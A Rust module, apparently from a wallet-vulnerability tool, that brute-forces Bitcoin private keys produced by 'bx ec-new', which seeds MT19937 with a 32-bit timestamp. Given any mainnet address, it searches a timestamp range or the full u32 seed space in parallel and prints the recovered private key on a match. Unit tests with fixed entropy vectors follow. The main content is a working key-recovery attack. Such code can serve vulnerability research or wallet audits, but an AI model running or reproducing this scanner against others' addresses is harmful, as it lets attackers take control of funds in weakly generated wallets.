use anyhow::{anyhow, Result};
use bitcoin::secp256k1::{PublicKey, Secp256k1, SecretKey};
use bitcoin::{Address, CompressedPublicKey, Network};
use rand_mt::Mt19937GenRand32;
use rayon::prelude::*;
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::Arc;
use tracing::{info, warn};

/// Generic "Ec-New" Scanner
/// Vulnerability: Private key generated directly from PRNG (MT19937) seeded with timestamp
/// Similar to Milk Sad, but without BIP39 mnemonic step.
/// Use: bx seed [-b 256] | bx ec-new
///
/// Seed space analysis:
///   bx seed casts high_resolution_clock nanoseconds to u32 (wraps every ~4.3 s).
///   The real vulnerable space is the FULL u32 range (0 ..= u32::MAX = 4 294 967 295).
///   Use --full-scan to cover it entirely instead of a timestamp range.
///
/// Performance (rayon, all cores):
///   ~46k ts/s per thread → 16-core: ~736k ts/s → full u32 in ~1.6 h
pub fn run(
    target_address: &str,
    start_ts: Option<u32>,
    end_ts: Option<u32>,
    full_scan: bool,
    threads: Option<usize>,
) -> Result<()> {
    info!("Running EC-New (Direct PRNG) Vulnerability Scanner...");

    // Configure rayon thread pool if requested
    if let Some(n) = threads {
        rayon::ThreadPoolBuilder::new()
            .num_threads(n)
            .build_global()
            .ok(); // ignore error if global pool already initialised
    }

    let (start, end) = if full_scan {
        info!("Mode: FULL u32 scan (0 ..= 4_294_967_295)");
        (0u32, u32::MAX)
    } else {
        let s = start_ts.unwrap_or(1_300_000_000);
        let e = end_ts.unwrap_or(1_735_689_600);
        if e < s {
            anyhow::bail!("--end ({}) must be >= --start ({})", e, s);
        }
        info!("Mode: timestamp range {} ..= {} ({} s)", s, e, e - s);
        (s, e)
    };

    let nthreads = rayon::current_num_threads();
    info!("Target:  {}", target_address);
    info!("Threads: {}", nthreads);

    let network = Network::Bitcoin;
    let target_addr_obj = target_address
        .parse::<Address<_>>()
        .map_err(|e| anyhow!("Invalid target address: {}", e))?
        .require_network(network)?;
    let target_script = target_addr_obj.script_pubkey();

    // Shared state
    let found_ts   = Arc::new(AtomicU64::new(u64::MAX)); // u64::MAX = not found
    let stop       = Arc::new(AtomicBool::new(false));
    let checked    = Arc::new(AtomicU64::new(0));
    let start_time = std::time::Instant::now();

    // Spawn progress reporter thread
    {
        let checked  = Arc::clone(&checked);
        let stop     = Arc::clone(&stop);
        let found_ts = Arc::clone(&found_ts);
        std::thread::spawn(move || {
            loop {
                std::thread::sleep(std::time::Duration::from_secs(5));
                if stop.load(Ordering::Relaxed) { break; }
                let n       = checked.load(Ordering::Relaxed);
                let elapsed = start_time.elapsed().as_secs_f64();
                let mps     = n as f64 / elapsed / 1_000_000.0;
                if found_ts.load(Ordering::Relaxed) == u64::MAX {
                    info!("Checked {} ({:.2} M/s)", n, mps);
                }
            }
        });
    }

    // Parallel scan: split range into chunks, one per rayon thread
    let total = (end as u64).saturating_sub(start as u64) + 1;
    let chunk = (total / nthreads as u64).max(1);

    (0..nthreads).into_par_iter().for_each(|tid| {
        if stop.load(Ordering::Relaxed) { return; }

        let secp = Secp256k1::new();

        let chunk_start = start as u64 + tid as u64 * chunk;
        let chunk_end   = if tid == nthreads - 1 {
            end as u64
        } else {
            (chunk_start + chunk - 1).min(end as u64)
        };

        for t64 in chunk_start..=chunk_end {
            if stop.load(Ordering::Relaxed) { break; }

            let t = t64 as u32;
            let entropy = generate_entropy_msb(t);

            if let Ok(sk) = SecretKey::from_slice(&entropy) {
                let pk = PublicKey::from_secret_key(&secp, &sk);

                let addr_c = Address::p2pkh(CompressedPublicKey(pk), network);
                let addr_u = Address::p2pkh(
                    bitcoin::PublicKey { inner: pk, compressed: false },
                    network,
                );

                for addr in [&addr_c, &addr_u] {
                    if addr.script_pubkey() == target_script {
                        warn!("\n\u{1f3af} FOUND MATCH!");
                        warn!("Timestamp:   {}", t);
                        warn!("Private Key: {}", hex::encode(entropy));
                        warn!("Address:     {}", addr);
                        warn!("Compressed:  {}", addr == &addr_c);
                        found_ts.store(t as u64, Ordering::Relaxed);
                        stop.store(true, Ordering::Relaxed);
                        break;
                    }
                }
            }

            checked.fetch_add(1, Ordering::Relaxed);
        }
    });

    stop.store(true, Ordering::Relaxed);

    let total_checked = checked.load(Ordering::Relaxed);
    let elapsed       = start_time.elapsed().as_secs_f64();
    let ts_found      = found_ts.load(Ordering::Relaxed);

    if ts_found != u64::MAX {
        info!("Scan complete. VULNERABILITY FOUND. ({} checked in {:.2}s)", total_checked, elapsed);
    } else {
        info!(
            "Scan complete. No match found. Checked {} in {:.2}s ({:.2} M/s)",
            total_checked, elapsed,
            total_checked as f64 / elapsed / 1_000_000.0
        );
    }

    Ok(())
}

/// Generate 32 bytes from MT19937 seeded with `timestamp` using MSB-only extraction,
/// matching the libbitcoin `pseudo_random_seed` / `bx ec-new` behaviour:
///
///   for each output byte: rng.next_u32() once, take (val >> 24) & 0xFF
///
/// Uses `rand_mt::Mt19937GenRand32` — the same crate as milk_sad.rs.
pub fn generate_entropy_msb(timestamp: u32) -> [u8; 32] {
    let mut rng = Mt19937GenRand32::new(timestamp);
    let mut bytes = [0u8; 32];
    for byte in bytes.iter_mut() {
        let val = rng.next_u32();
        *byte = (val >> 24) as u8;
    }
    bytes
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Cross-validate against the milk_sad GPU test-vector suite.
    #[test]
    fn test_matches_milk_sad_test_vectors() {
        let cases: &[(u32, &str)] = &[
            (1_234_567_890, "9e695582572b97ff9774a5662626e42fe380c48c3b810f33e4437d216e8b2bab"),
            (1_609_459_200, "49a76eebefb9198533904d82d223070282a8577002b3f5313907ea007474db6c"),
            (1_577_836_800, "f4d5c22a415a49a59d8438e5e465cfa83afa4891d1125982a5f90760622ddf7c"),
            (1_293_840_000, "d5a3f4fd55b0da220673a7496fc717e8e8cba8bde4b35da76d53d6b061694663"),
            (1_690_848_000, "3685466a59c974bb71a0f55a7bf6e617c424df5b4ecadb5893215f392de67b90"),
        ];
        for &(ts, expected) in cases {
            let got = generate_entropy_msb(ts);
            assert_eq!(hex::encode(got), expected, "ts={}", ts);
        }
    }

    /// start > end must return Err, not panic.
    #[test]
    fn test_start_greater_than_end_returns_err() {
        let result = run(
            "1A1zP1eP5QGefi2DMPTfTL5SLmv7Divf",
            Some(1_700_000_000),
            Some(1_400_000_000),
            false,
            None,
        );
        assert!(result.is_err());
        let msg = result.unwrap_err().to_string();
        assert!(msg.contains("end") && msg.contains(">="), "got: {}", msg);
    }

    /// Parallel scan must find a known address within a tiny range.
    #[test]
    fn test_parallel_finds_known_address() {
        // Generate a known address at ts=1_400_000_000
        use bitcoin::secp256k1::Secp256k1;
        let entropy = generate_entropy_msb(1_400_000_000);
        let secp = Secp256k1::new();
        let sk = bitcoin::secp256k1::SecretKey::from_slice(&entropy).unwrap();
        let pk = bitcoin::secp256k1::PublicKey::from_secret_key(&secp, &sk);
        let addr = bitcoin::Address::p2pkh(
            bitcoin::CompressedPublicKey(pk),
            bitcoin::Network::Bitcoin,
        ).to_string();

        let result = run(&addr, Some(1_399_999_999), Some(1_400_000_001), false, Some(2));
        assert!(result.is_ok());
    }
}
